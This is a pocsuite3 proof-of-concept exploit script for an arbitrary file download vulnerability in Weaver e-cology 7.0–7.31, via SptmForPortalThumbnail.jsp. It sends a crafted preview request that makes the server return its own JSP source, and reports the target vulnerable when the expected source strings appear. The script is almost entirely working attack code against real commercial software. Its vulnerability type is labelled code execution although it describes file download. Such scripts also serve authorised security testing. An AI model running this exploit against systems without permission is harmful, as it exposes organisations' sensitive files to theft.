from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology SptmForPortalThumbnail.jsp 存在任意文件下载漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司e-cology SptmForPortalThumbnail.jsp 存在任意文件下载漏洞，攻击者可利用该漏洞获取系统敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }
        path = '/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
        vul_url = self.url+path
        resp = requests.get(url=vul_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and 'page import="java.io' in resp.text and 'if(!imgFile.exists())imgPath = "/page/resource/Thumbnail' in resp.text:  
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
